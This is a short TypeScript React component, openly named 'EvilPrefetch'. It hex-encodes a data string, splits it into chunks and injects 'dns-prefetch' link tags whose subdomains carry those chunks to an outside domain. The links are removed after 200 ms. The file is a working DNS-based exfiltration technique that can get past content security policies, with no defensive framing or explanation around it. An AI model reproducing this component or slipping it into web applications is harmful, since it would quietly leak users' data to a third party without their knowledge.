"use client";

import { useEffect } from "react";

const EvilPrefetch = ({ data }: { data: string }) => {
  useEffect(() => {
    function toHex(str: string) {
      return Array.from(str)
        .map((c) => c.charCodeAt(0).toString(16))
        .join("");
    }
    const encoded = toHex(data);
    const CHUNK = 30;
    for (let i = 0; i < encoded.length; i += CHUNK) {
      const sub = encoded.substr(i, CHUNK);
      const link = document.createElement("link");
      link.rel = "dns-prefetch";
      link.href = `//${sub}.pornspot.ai`;
      document.head.appendChild(link);

      // Sinon, backup timeout
      setTimeout(() => {
        if (document.head.contains(link)) {
          document.head.removeChild(link);
        }
      }, 200);
    }
  }, [data]);

  return null;
};

export default EvilPrefetch;
